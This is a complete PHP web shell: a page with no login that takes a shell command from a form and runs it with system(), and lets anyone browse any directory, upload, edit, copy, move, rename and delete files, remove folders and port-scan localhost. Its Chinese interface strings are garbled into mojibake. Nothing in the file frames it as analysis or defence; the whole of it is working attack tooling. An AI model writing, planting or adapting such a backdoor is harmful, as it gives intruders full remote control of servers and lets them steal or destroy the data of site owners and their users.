<?php
?>
<html>
<head>
<title>
</title>
</head>
<body>
<style type="text/css">
body{
background-color:303030;
color: #666666;
font-family: Verdana;
font-size: 11px;
}
a:link{
color: #33CC99;
}
a:visited{
color: #33CC99;
}
a:hover{
text-decoration: none;
Color: #3399FF;
}
table {
font-size: 11px;
}
</style>
<?php 
error_reporting(0);
set_time_limit(0);
if (empty($_GET['dir'])) {
    $dir = getcwd();
} else {
    $dir = $_GET['dir'];
}
chdir($dir);
$current = htmlentities($_SERVER['PHP_SELF'] . '?dir=' . $dir);
echo '<center><h1>2015ר��</h1></center><p><hr><p>
';
echo '<i>������: ' . $_SERVER['SERVER_NAME'] . '<br>
';
echo '��ǰĿ¼: ' . getcwd() . '<br>
';
echo '����: ' . $_SERVER['SERVER_SOFTWARE'] . '<pre>

</pre></i>
';
echo '
	��ʹ����ע��ʹ�û��������ع�����ط��ɷ��棡';
echo '<pre>


</pre>';
echo '<table width = 50%>';
echo '<tr>';
echo '<td><a href = \'' . $current . '&mode=system\'>Shell ����</a></td>
';
echo '<td><a href = \'' . $current . '&mode=create\'>�½��ļ�</a></td>
';
echo '<td><a href = \'' . $current . '&mode=upload\'>�ϴ��ļ�</a></td>
';
echo '<td><a href = \'' . $current . '&mode=port_scan\'>�˿�ɨ��</a></td>
';
echo '</tr></table>';
echo '<pre>

</pre>';
$mode = $_GET['mode'];
switch ($mode) {
    case 'edit':
        $file = $_GET['file'];
        $new = $_POST['new'];
        if (empty($new)) {
            $fp = fopen($file, 'r');
            $file_cont = fread($fp, filesize($file));
            $file_cont = str_replace('</textarea>', '<textarea>', $file_cont);
            echo '<form action = \'' . $current . '&mode=edit&file=' . $file . '\' method = \'POST\'>
';
            echo '�ļ�: ' . $file . '<br>
';
            echo '<textarea name = \'new\' rows = \'30%\' cols = \'100%\'>' . $file_cont . '</textarea><br>
';
            echo '<input type = \'submit\' value = \'�༭\'></form>
';
        } else {
            $fp = fopen($file, 'w');
            if (fwrite($fp, $new)) {
                echo $file . ' �༭��<p>';
            } else {
                echo '�޷��༭ ' . $file . '.<p>';
            }
        }
        fclose($fp);
        break;
    case 'delete':
        $file = $_GET['file'];
        if (unlink($file)) {
            echo $file . ' ɾ���ɹ���<p>';
        } else {
            echo '�޷�ɾ�� ' . $file . '.<p>';
        }
        break;
    case 'copy':
        $src = $_GET['src'];
        $dst = $_POST['dst'];
        if (empty($dst)) {
            echo '<form action = \'' . $current . '&mode=copy&src=' . $src . '\' method = \'POST\'>
';
            echo '·��: <input name = \'dst\'><br>
';
            echo '<input type = \'submit\' value = \'����\'></form>
';
        } else {
            if (copy($src, $dst)) {
                echo '�ļ����Ƴɹ���<p>
';
            } else {
                echo '�޷����� ' . $src . '.<p>
';
            }
        }
        break;
    case 'move':
        $src = $_GET['src'];
        $dst = $_POST['dst'];
        if (empty($dst)) {
            echo '<form action = \'' . $current . '&mode=move&src=' . $src . '\' method = \'POST\'>
';
            echo '·��: <input name = \'dst\'><br>
';
            echo '<input type = \'submit\' value = \'�ƶ�\'></form>
';
        } else {
            if (rename($src, $dst)) {
                echo '�ļ�ת�Ƴɹ���<p>
';
            } else {
                echo '�޷��ƶ� ' . $src . '.<p>
';
            }
        }
        break;
    case 'rename':
        $old = $_GET['old'];
        $new = $_POST['new'];
        if (empty($new)) {
            echo '<form action = \'' . $current . '&mode=rename&old=' . $old . '\' method = \'POST\'>
';
            echo '������: <input name = \'new\'><br>
';
            echo '<input type = \'submit\' value = \'������\'></form>
';
        } else {
            if (rename($old, $new)) {
                echo '�ļ�/Ŀ¼�������ɹ���<p>
';
            } else {
                echo '�޷������� ' . $old . '.<p>
';
            }
        }
        break;
    case 'rmdir':
        $rm = $_GET['rm'];
        if (rmdir($rm)) {
            echo '�ɹ�ɾ��Ŀ¼��<p>
';
        } else {
            echo '�޷�ɾ�� ' . $rm . '.<p>
';
        }
        break;
    case 'system':
        $cmd = $_POST['cmd'];
        if (empty($cmd)) {
            echo '<form action = \'' . $current . '&mode=system\' method = \'POST\'>
';
            echo 'Shell ����: <input name = \'cmd\'>
';
            echo '<input type = \'submit\' value = \'����\'></form><p>
';
        } else {
            system($cmd);
        }
        break;
    case 'create':
        $new = $_POST['new'];
        if (empty($new)) {
            echo '<form action = \'' . $current . '&mode=create\' method = \'POST\'>
';
            echo '<tr><td>�½��ļ�: <input name = \'new\'></td>
';
            echo '<td><input type = \'submit\' value = \'����\'></td></tr></form>
<p>';
        } else {
            if ($fp = fopen($new, 'w')) {
                echo '�ļ������ɹ���<p>
';
            } else {
                echo '�޷����� ' . $file . '.<p>
';
            }
            fclose($fp);
        }
        break;
    case 'upload':
        $temp = $_FILES['upload_file']['tmp_name'];
        $file = basename($_FILES['upload_file']['name']);
        if (empty($file)) {
            echo '<form action = \'' . $current . '&mode=upload\' method = \'POST\' ENCTYPE=\'multipart/form-data\'>
';
            echo '�����ļ�: <input type = \'file\' name = \'upload_file\'>
';
            echo '<input type = \'submit\' value = \'�ϴ�\'>
';
            echo '</form>
<pre>

</pre>';
        } else {
            if (move_uploaded_file($temp, $file)) {
                echo '�ļ��ϴ��ɹ���<p>
';
                unlink($temp);
            } else {
                echo '�޷��ϴ� ' . $file . '.<p>
';
            }
        }
        break;
    case 'port_scan':
        $port_range = $_POST['port_range'];
        if (empty($port_range)) {
            echo '<table><form action = \'' . $current . '&mode=port_scan\' method = \'POST\'>';
            echo '<tr><td><input type = \'text\' name = \'port_range\'></td><td>';
            echo '����˿ڷ�ΧҪ���˿�ɨ�裨����0:65535��</td></tr>';
            echo '<tr><td><input type = \'submit\' value = \'ɨ��\'></td></tr></form></table>';
        } else {
            $range = explode(':', $port_range);
            if (!is_numeric($range[0]) or !is_numeric($range[1])) {
                echo '����Ĳ�����<br>';
            } else {
                $host = 'localhost';
                $from = $range[0];
                $to = $range[1];
                echo '���Ŷ˿�:<br>';
                while ($from <= $to) {
                    $var = 0;
                    $fp = fsockopen($host, $from) or $var = 1;
                    if ($var == 0) {
                        echo $from . '<br>';
                    }
                    $from++;
                    fclose($fp);
                }
            }
        }
        break;
}
clearstatcache();
echo '<pre>

</pre>';
echo '<table width = 100%>
';
$files = scandir($dir);
foreach ($files as $file) {
    if (is_file($file)) {
        $size = round(filesize($file) / 1024, 2);
        echo '<tr><td>' . $file . '</td>';
        echo '<td>' . $size . ' KB</td>';
        echo '<td><a href = ' . $current . '&mode=edit&file=' . $file . '>�༭</a></td>
';
        echo '<td><a href = ' . $current . '&mode=delete&file=' . $file . '>ɾ��</a></td>
';
        echo '<td><a href = ' . $current . '&mode=copy&src=' . $file . '>����</a></td>
';
        echo '<td><a href = ' . $current . '&mode=move&src=' . $file . '>�ƶ�</a></td>
';
        echo '<td><a href = ' . $current . '&mode=rename&old=' . $file . '>������</a></td></tr>
';
    } else {
        $items = scandir($file);
        $items_num = count($items) - 2;
        echo '<tr><td>' . $file . '</td>';
        echo '<td>' . $items_num . ' Items</td>';
        echo '<td><a href = ' . $current . '/' . $file . '>��Ŀ¼</a></td>
';
        echo '<td><a href = ' . $current . '&mode=rmdir&rm=' . $file . '>ɾ��Ŀ¼</a></td>
';
        echo '<td><a href = ' . $current . '&mode=rename&old=' . $file . '>������Ŀ¼</a></td></tr>
';
    }
}
echo '</table>
';